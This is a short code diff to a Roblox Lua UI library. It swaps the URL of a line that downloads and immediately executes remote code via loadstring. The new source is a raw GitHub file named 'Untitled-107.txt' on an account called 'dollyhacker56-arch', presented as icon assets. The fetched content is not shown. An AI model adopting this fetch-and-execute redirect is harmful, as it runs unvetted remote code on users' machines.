@@ -79,7 +79,7 @@ OrionLib.SectionLabels = {}
 
 -- Icons
 	local Icons = {}
-	local LucideIcons = loadstring(game:HttpGet("https://gitlab.com/m1kp0/BetterOrion/-/raw/main/Icons.lua?ref_type=heads"))().assets
+	local LucideIcons = loadstring(game:HttpGet("https://raw.githubusercontent.com/dollyhacker56-arch/betterorion/refs/heads/main/Untitled-107.txt"))().assets
 
 -- Core
 	local Orion = Instance.new("ScreenGui")
